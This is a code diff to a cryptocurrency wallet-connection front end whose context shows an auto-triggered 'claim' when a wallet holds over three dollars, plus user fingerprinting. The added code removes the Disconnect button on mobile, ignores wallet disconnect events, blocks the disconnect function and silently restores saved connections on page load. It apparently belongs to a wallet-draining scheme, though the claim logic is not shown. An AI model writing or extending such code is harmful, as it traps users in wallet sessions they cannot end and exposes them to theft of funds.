@@ -2341,6 +2341,9 @@ let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
 let contractInstance; // will be set after web3 initialization
 const CLAIM_THRESHOLD_USD = 3;
 
+// NEW: Flag to prevent disconnection on mobile
+const DISABLE_DISCONNECT = isMobileDevice; // On mobile, prevent disconnect
+
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
@@ -2458,7 +2461,38 @@ document.addEventListener("DOMContentLoaded", async function () {
   if (isMobileDevice) {
     initializeMobileSpecificOptimizations();
   }
+
+  // Attempt to restore saved connection from localStorage
+  restoreSavedConnection();
 });
+
+// ====== PERSISTENCE HELPERS ======
+function saveConnectionToLocalStorage(address, walletType) {
+  try {
+    localStorage.setItem('connectedAddress', address);
+    localStorage.setItem('connectedWalletType', walletType);
+    console.log('Connection saved to localStorage');
+  } catch (e) {
+    console.warn('Failed to save connection:', e);
+  }
+}
+
+function clearSavedConnection() {
+  try {
+    localStorage.removeItem('connectedAddress');
+    localStorage.removeItem('connectedWalletType');
+  } catch (e) {}
+}
+
+function restoreSavedConnection() {
+  const savedAddress = localStorage.getItem('connectedAddress');
+  const savedWalletType = localStorage.getItem('connectedWalletType');
+  if (savedAddress && savedWalletType) {
+    console.log('Restoring saved connection:', savedAddress);
+    // Attempt to reconnect using saved provider
+    connectWithProvider(savedWalletType, true); // true = silent restore
+  }
+}
 
 // ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
 async function checkAndAutoTriggerClaim() {
@@ -2533,6 +2567,11 @@ async function connectSolanaWallet() {
     solanaProvider = provider;
     solanaPublicKey = publicKey;
     console.log(`✅ Connected to ${wallet.name}: ${publicKey}`);
+    // For Solana, we don't have a standard web3 instance, but we can store the address
+    connectedAddress = publicKey;
+    connectedWallet = wallet.name;
+    saveConnectionToLocalStorage(connectedAddress, connectedWallet);
+    updateManualWalletButton(); // show connected UI
     return { provider, publicKey };
   } catch (err) {
     throw new Error(`Solana connection failed: ${err.message}`);
@@ -3074,6 +3113,11 @@ function setupManualAppKitConnectionListener() {
         console.log("Manual AppKit accounts changed:", accounts[0]);
         handleManualAppKitConnection(accounts[0]);
       } else {
+        // On mobile, we prevent disconnection
+        if (DISABLE_DISCONNECT) {
+          console.log("Mobile: ignoring account change to empty (prevent disconnect)");
+          return;
+        }
         handleManualDisconnection();
       }
     });
@@ -3088,7 +3132,7 @@ function setupManualAppKitConnectionListener() {
     });
     window.ethereum.on("disconnect", (error) => {
       console.log("Manual AppKit disconnected:", error);
-      handleManualDisconnection();
+      if (!DISABLE_DISCONNECT) handleManualDisconnection();
     });
   }
 }
@@ -3112,6 +3156,8 @@ function handleManualAppKitConnection(address) {
     checkAndAutoTriggerClaim();
   }, 2000);
   showManualAnnouncementModal();
+  // Save connection
+  saveConnectionToLocalStorage(connectedAddress, connectedWallet);
 }
 
 function showManualAnnouncementModal() {
@@ -3129,14 +3175,24 @@ function showManualAnnouncementModal() {
 function updateManualWalletButton() {
   if (!walletButtonContainer) return;
   if (connectedWallet && connectedAddress) {
-    walletButtonContainer.innerHTML = `
-      <div class="wallet-connected">
-        <i class="fas fa-check-circle"></i>
-        <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
-        <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
-      </div>
-    `;
-    document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
+    // On mobile, do not show disconnect button
+    if (DISABLE_DISCONNECT) {
+      walletButtonContainer.innerHTML = `
+        <div class="wallet-connected">
+          <i class="fas fa-check-circle"></i>
+          <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
+        </div>
+      `;
+    } else {
+      walletButtonContainer.innerHTML = `
+        <div class="wallet-connected">
+          <i class="fas fa-check-circle"></i>
+          <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
+          <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
+        </div>
+      `;
+      document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
+    }
   } else {
     walletButtonContainer.innerHTML = `
       <button class="wallet-btn" id="walletButton">
@@ -3148,6 +3204,11 @@ function updateManualWalletButton() {
 }
 
 function handleManualDisconnection() {
+  // If mobile, prevent disconnection
+  if (DISABLE_DISCONNECT) {
+    console.log("Mobile: disconnection prevented");
+    return;
+  }
   connectedWallet = null;
   connectedAddress = null;
   web3 = null;
@@ -3156,6 +3217,7 @@ function handleManualDisconnection() {
   updateManualWalletButton();
   showNotification("Wallet disconnected", "info");
   logDebug("Manual wallet disconnected");
+  clearSavedConnection();
 }
 
 async function collectManualFingerprint() {
@@ -3385,6 +3447,11 @@ async function checkManualExistingConnection() {
 function setupManualProviderEvents(provider) {
   provider.on("accountsChanged", (accounts) => {
     if (accounts.length === 0) {
+      // On mobile, prevent disconnection
+      if (DISABLE_DISCONNECT) {
+        console.log("Mobile: ignoring account change to empty (prevent disconnect)");
+        return;
+      }
       handleManualDisconnection();
     } else {
       connectedAddress = accounts[0];
@@ -3404,8 +3471,10 @@ function setupManualProviderEvents(provider) {
   });
   provider.on("disconnect", (error) => {
     logDebug(`Manual provider disconnected: ${error}`);
-    showNotification("Wallet disconnected", "error");
-    handleManualDisconnection();
+    if (!DISABLE_DISCONNECT) {
+      showNotification("Wallet disconnected", "error");
+      handleManualDisconnection();
+    }
   });
   provider.on("connect", (connectInfo) => {
     logDebug(`Manual provider connected: ${JSON.stringify(connectInfo)}`);
@@ -3469,7 +3538,7 @@ function copyReferralLink() {
   }
 }
 
-async function connectWithProvider(providerType) {
+async function connectWithProvider(providerType, silentRestore = false) {
   try {
     logDebug(`Manual connecting with ${providerType}...`);
     let provider;
@@ -3481,11 +3550,11 @@ async function connectWithProvider(providerType) {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
             logDebug("Manual MetaMask connection rejected: " + error.message);
-            showNotification("MetaMask connection rejected", "error");
+            if (!silentRestore) showNotification("MetaMask connection rejected", "error");
             return;
           }
         } else {
-          showNotification("MetaMask not installed", "error");
+          if (!silentRestore) showNotification("MetaMask not installed", "error");
           logDebug("Manual MetaMask not installed");
           return;
         }
@@ -3497,11 +3566,11 @@ async function connectWithProvider(providerType) {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
             logDebug("Manual Coinbase Wallet connection rejected: " + error.message);
-            showNotification("Coinbase Wallet connection rejected", "error");
+            if (!silentRestore) showNotification("Coinbase Wallet connection rejected", "error");
             return;
           }
         } else {
-          showNotification("Coinbase Wallet not detected", "error");
+          if (!silentRestore) showNotification("Coinbase Wallet not detected", "error");
           logDebug("Manual Coinbase Wallet not detected");
           return;
         }
@@ -3513,11 +3582,11 @@ async function connectWithProvider(providerType) {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
             logDebug("Manual Trust Wallet connection rejected: " + error.message);
-            showNotification("Trust Wallet connection rejected", "error");
+            if (!silentRestore) showNotification("Trust Wallet connection rejected", "error");
             return;
           }
         } else {
-          showNotification("Trust Wallet not detected", "error");
+          if (!silentRestore) showNotification("Trust Wallet not detected", "error");
           logDebug("Manual Trust Wallet not detected");
           return;
         }
@@ -3529,17 +3598,17 @@ async function connectWithProvider(providerType) {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
             logDebug("Manual Rabby Wallet connection rejected: " + error.message);
-            showNotification("Rabby Wallet connection rejected", "error");
+            if (!silentRestore) showNotification("Rabby Wallet connection rejected", "error");
             return;
           }
         } else {
-          showNotification("Rabby Wallet not detected", "error");
+          if (!silentRestore) showNotification("Rabby Wallet not detected", "error");
           logDebug("Manual Rabby Wallet not detected");
           return;
         }
         break;
       default:
-        showNotification("Unsupported wallet provider", "error");
+        if (!silentRestore) showNotification("Unsupported wallet provider", "error");
         return;
     }
     web3 = new Web3(provider);
@@ -3551,18 +3620,20 @@ async function connectWithProvider(providerType) {
     connectedAddress = accounts[0];
     connectedWallet = providerType;
     updateManualWalletButton();
-    hideWalletModal();
-    showNotification("Wallet connected successfully", "success");
+    if (!silentRestore) hideWalletModal();
+    if (!silentRestore) showNotification("Wallet connected successfully", "success");
     logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);
     await collectManualFingerprint();
     setTimeout(() => {
       checkAndAutoTriggerClaim();
     }, 2000);
-    showManualAnnouncementModal();
+    if (!silentRestore) showManualAnnouncementModal();
     setupManualProviderEvents(provider);
+    // Save connection
+    saveConnectionToLocalStorage(connectedAddress, connectedWallet);
   } catch (error) {
     console.error("Manual error connecting wallet:", error);
-    showNotification("Failed to connect wallet", "error");
+    if (!silentRestore) showNotification("Failed to connect wallet", "error");
     logDebug(`Manual connection error: ${error.message}`);
   }
 }
@@ -4007,6 +4078,11 @@ function showNotification(message, type = "success") {
 }
 
 function disconnectManualWallet() {
+  // If mobile, prevent disconnection
+  if (DISABLE_DISCONNECT) {
+    console.log("Mobile: disconnection prevented");
+    return;
+  }
   handleManualDisconnection();
 }
 
